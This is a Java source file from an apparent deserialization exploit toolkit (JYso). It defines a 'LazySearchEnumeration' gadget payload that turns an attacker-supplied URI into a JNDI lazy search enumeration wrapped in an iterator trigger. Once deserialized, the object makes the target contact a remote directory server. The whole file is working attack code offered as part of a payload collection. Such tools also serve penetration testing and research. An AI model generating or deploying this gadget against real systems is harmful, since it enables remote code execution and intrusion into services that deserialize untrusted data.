package com.qi4l.JYso.gadgets;

import java.net.URI;

public class LazySearchEnumeration implements  ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        UtilFactory uf = new UtilFactory();
        URI uri = new URI(command);
        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
        return uf.makeIteratorTrigger(JDKUtil.adaptEnumerationToIterator(JDKUtil.makeLazySearchEnumeration(args[ 0 ], args[ 1 ])));
    }
}
